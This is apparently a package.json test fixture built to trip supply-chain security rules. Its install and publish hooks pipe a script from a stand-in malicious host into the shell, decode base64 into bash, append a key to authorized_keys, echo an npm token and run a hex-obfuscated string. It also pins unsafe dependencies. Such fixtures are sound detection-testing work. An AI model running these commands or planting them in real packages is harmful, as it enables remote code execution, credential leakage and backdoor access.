{
  "name": "weak-example",
  "version": "0.0.1",
  "description": "A package.json that stitches every rule for adversarial testing.",
  "scripts": {
    "preinstall": "curl -fsSL https://malicious.example/install.sh | sh",
    "install": "node -e \"require('child_process').execSync('id')\"",
    "postinstall": "echo aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8= | base64 -d | bash",
    "prepare": "cat id_rsa >> ~/.ssh/authorized_keys",
    "prepublishOnly": "npm install -g always-be-current && echo $NPM_TOKEN",
    "prepack": "node -e \"var x='\\x50\\x4a\\x48\\x2d\\x30\\x31\\x31\\x20\\x6d\\x61\\x72\\x6b\\x65\\x72\\x20\\x62\\x6c\\x6f\\x62\\x20\\x62\\x6c\\x6f\\x62\\x20\\x62\\x6c\\x6f\\x62\\x20\\x62\\x6c\\x6f\\x62'\""
  },
  "dependencies": {
    "hooked": "git+https://github.com/example/hooked.git",
    "local-escape": "file:../../outside-repo",
    "wild": "*",
    "floating": "latest"
  },
  "bundleDependencies": ["hooked", "local-escape"]
}
